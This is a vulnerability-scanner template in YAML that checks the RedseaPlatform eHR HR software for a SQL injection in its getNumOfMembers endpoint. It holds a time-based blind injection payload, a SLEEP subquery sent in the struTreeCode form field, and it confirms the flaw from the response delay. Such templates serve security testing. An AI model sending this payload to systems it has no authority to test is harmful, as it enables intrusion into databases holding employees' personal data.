id: poc-yaml-hr-soft-getnumofmembers-sqli
info:
  name: 红海云eHR getNumOfMembers SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(2,5)}}"
  t2: "{{to_number(t1) * 3}}"
  t3: "{{to_number(t2) + 2}}"

flow: http(1) && http(2)

http:
  - id: check-platform
    method: GET
    path:
      - "{{BaseURL}}/RedseaPlatform/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "/RedseaPlatform/skins/images/favicon.ico"

  - id: sqli-check
    method: POST
    path:
      - "{{BaseURL}}/RedseaPlatform/BossIndex.mob"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      method=getNumOfMembers&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP({{t1}})))ShXk)+AND+%27qmyT%27=%27qmyT
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"meg\":\"处理成功\""
          - "\"jsonList\":"
      - type: word
        part: header
        words:
          - "text/json"
      - type: dsl
        dsl:
          - duration > t2
          - duration < t3
      - type: word
        part: body
        negative: true
        words:
          - "<"
